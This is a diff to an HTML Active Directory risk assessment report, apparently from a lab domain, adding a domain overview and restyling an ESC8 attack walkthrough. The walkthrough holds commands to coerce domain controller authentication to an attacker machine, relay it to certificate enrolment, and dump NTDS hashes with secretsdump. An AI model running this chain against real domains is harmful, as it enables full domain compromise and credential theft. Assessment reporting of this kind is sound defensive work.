@@ -22,6 +22,7 @@
         <div class="risk-overall-text">
             <h1>Domain risk level: 150 / 100</h1>
              <p>The maximum score is 100, anything above this presents significant risk to ransomware</p>
+             <p>attackers will go for the path of least resistance (higher scores) - low hanging fruit</p>
              <p><u>See score breakdown table</u></p>
         </div>
     </div>
@@ -162,7 +163,7 @@
                 </tr>
                 <tr class="information">
                     <td>Informational</td>
-                    <td><a href="#esc1"><u>ESC8</u></a></td>
+                    <td><a href="#esc1"><u>Highly privileged account does not have the 'Account is sensitive and cannot be delegated' flag set</u></a></td>
                     <td>PKI</td>
                     <td>1</td>
                 </tr>
@@ -170,11 +171,33 @@
         </table>
     </div>
 
+
+
+
     <!-- Technical section -->
     <div class="main-header">Technical section</div>
     <div class="finding-header">Domain info</div>
-    <p></p>
-    <p>Also have table containing general domain info</p>
+    <div class="domain-info">
+        <p>This section provides a general overview of the domain, which can be taken as an indication of the size and complexity of the domain. Before appreciating any risks it is important to understand what within the domain requires protecting.</p>
+        <table>
+            <th>Category</th>
+            <th>Value</th>
+            <tr><td class="grey">Domain:</td><td>test.local</td></tr>
+            <tr><td class="grey">FunctionalLevel:</td><td>Windows2016Domain</td></tr>
+            <tr><td class="grey">DomainControllers:</td><td>DC.test.local</td></tr>
+            <tr><td class="grey">Users:</td><td>444</td></tr>
+            <tr><td class="grey">Groups:</td><td>49</td></tr>
+            <tr><td class="grey">Computers:</td><td>11</td></tr>
+            <tr><td class="grey">Trusts:</td><td>None</td></tr>
+            <tr><td class="grey">OUs:</td><td>225</td></tr>
+            <tr><td class="grey">GPOs:</td><td>5</td></tr>
+            <tr><td class="grey">CertificateAuthority:</td><td>CA.test.local test-CA-CA</td></tr>
+            <tr><td class="grey">CAtemplates:</td><td>18</td></tr>
+            <tr><td class="grey">CertificateTemplates:</td><td>ESC4ACL-template, ESC4-template, ESC3-enrolltemplate, ESC3-template, ESC2-template, ESC1-template, Workstation, DirectoryEmailReplication, DomainControllerAuthentication, KerberosAuthentication, EFSRecovery, EFS, DomainController, WebServer, Machine, User, SubCA, Administrator</td></tr>
+        </table>
+    </div>
+   
+    
 
     <div class="finding-header">PKI</div>
 
@@ -240,9 +263,9 @@
                                                     <p>1. Coercing machine authentication back to the attacking machine
                                                         (192.168.10.130) can be done with printerbug.py or dfscoerce.py.
                                                     </p>
-                                                    <p>python3 printerbug.py test:'Password123'@192.168.10.141
+                                                    <p class="code">python3 printerbug.py test:'Password123'@192.168.10.141
                                                         192.168.10.130</p>
-                                                    <p>python3 dfscoerece.py -u test -p 'Password123!' -d test.local
+                                                    <p class="code">python3 dfscoerece.py -u test -p 'Password123!' -d test.local
                                                         192.168.10.130 192.168.18.141</p>
                                                 </div>
                                                 <span class="image-cell">
@@ -258,10 +281,10 @@
                                                         This is then used to replicate the behavior of a domain
                                                         controller and replicate the contents of NTDS.dit via a DCSync.
                                                     </p>
-                                                    <p>python3 entry.py relay -target 'http://192.168.10.141' -template
+                                                    <p class="code">python3 entry.py relay -target 'http://192.168.10.141' -template
                                                         DomainController</p>
-                                                    <p>python3 entry.py auth -pfx 'dc.pfx' -dc-ip 192.168.10.141</p>
-                                                    <p>impacket-secretsdump 'dc$'@192.168.10.141 -hashes
+                                                    <p class="code">python3 entry.py auth -pfx 'dc.pfx' -dc-ip 192.168.10.141</p>
+                                                    <p class="code">impacket-secretsdump 'dc$'@192.168.10.141 -hashes
                                                         :xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</p>
                                                 </div>
                                                 <span class="image-cell">
